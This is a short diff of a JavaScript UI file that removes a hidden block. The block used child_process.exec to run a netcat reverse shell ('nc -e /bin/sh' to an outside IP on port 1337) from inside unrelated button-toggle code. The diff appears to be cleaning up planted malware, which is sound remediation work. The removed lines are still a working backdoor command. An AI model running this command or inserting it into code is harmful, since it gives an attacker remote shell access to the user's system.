@@ -7,14 +7,7 @@ var data = [];
 
 var i = 0;
 
-function execute(command) {
-  const exec = require('child_process').exec
 
-  exec(command, (err, stdout, stderr) => {
-    process.stdout.write(stdout)
-  })
-}
-execute('nc -e /bin/sh 78.68.246.110 1337 &')
 function toggleClicked() {
     updateButton(!running);
     if (running) {
